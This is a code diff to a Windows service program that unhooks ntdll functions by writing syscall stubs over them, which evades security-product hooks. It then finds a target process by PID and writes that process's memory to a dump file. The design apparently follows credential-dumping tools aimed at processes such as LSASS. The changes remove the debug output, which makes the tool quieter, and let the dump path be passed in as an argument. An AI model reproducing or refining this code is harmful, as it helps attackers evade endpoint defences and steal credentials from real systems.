@@ -16,7 +16,7 @@ SERVICE_STATUS g_ServiceStatus = { 0 };
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
 HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
 
-VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
+VOID WINAPI ServiceMain(DWORD argc, TCHAR* argv[]);
 VOID WINAPI ServiceCtrlHandler(DWORD);
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
 
@@ -49,30 +49,20 @@ BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
 
 	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);
 
-	printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
-	printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
-	printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
-
 	LPVOID lpBaseAddress = lpProcAddress;
 	ULONG OldProtection, NewProtection;
 	SIZE_T uSize = 10;
 	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
-	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+	if (status != STATUS_SUCCESS)
 		return FALSE;
-	}
 
 	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
-	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
+	if (status != STATUS_SUCCESS)
 		return FALSE;
-	}
 
 	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
-	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+	if (status != STATUS_SUCCESS)
 		return FALSE;
-	}
 
 	return TRUE;
 }
@@ -84,23 +74,19 @@ BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
 		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
 		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
 		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
-	}
-	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
+	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
 		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
 		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
 		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
-	}
-	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
+	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
 		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
 		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
 		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
-	}
-	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
+	} else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
 		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
 		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
 		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
-	}
-	else {
+	} else {
 		return FALSE;
 	}
 
@@ -131,7 +117,6 @@ BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
 			break;
 		}
 		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);
-
 	} while (pProcInfo);
 
 	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);
@@ -196,7 +181,7 @@ constexpr DWORD DUMP_STATUS_FAILED_TO_OBTAIN_PROCESS_HANDLE = 6;
 constexpr DWORD DUMP_STATUS_FAILED_TO_CREATE_FILE = 7;
 constexpr DWORD DUMP_STATUS_DUMP_CALL_FAILED = 8;
 
-DWORD dump() {
+DWORD dump(LPTSTR dump_path) {
 	if (sizeof(LPVOID) != 8)
           return DUMP_STATUS_NOT_64_BIT;
 
@@ -278,10 +263,7 @@ DWORD dump() {
 
 	// Build the file path.
 	WCHAR chDmpFile[MAX_PATH] = L"\\??\\";
-	WCHAR chWinPath[MAX_PATH];
-	GetWindowsDirectory(chWinPath, MAX_PATH);
-	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
-	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dump.dmp");
+	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), dump_path);
 	UNICODE_STRING uFileName;
 	RtlInitUnicodeString(&uFileName, chDmpFile);
 
@@ -331,7 +313,7 @@ DWORD dump() {
 
 int _tmain(int argc, TCHAR* argv[]) {
     SERVICE_TABLE_ENTRY ServiceTable[] = {
-        {(LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
+        {(LPWSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
         {NULL, NULL}
     };
 
@@ -341,7 +323,7 @@ int _tmain(int argc, TCHAR* argv[]) {
     return 0;
 }
 
-VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
+VOID WINAPI ServiceMain(DWORD argc, TCHAR* argv[]) {
     DWORD Status = E_FAIL;
 
     g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
@@ -391,7 +373,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
     // Wait until our worker thread exits effectively signaling that the service
     // needs to stop
     WaitForSingleObject(
-		CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL),
+		CreateThread(NULL, 0, ServiceWorkerThread, argv[1], 0, NULL),
 		INFINITE
 	);
 
@@ -436,5 +418,5 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
 }
 
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
-	return dump();
+	return dump((LPTSTR)lpParam);
 }
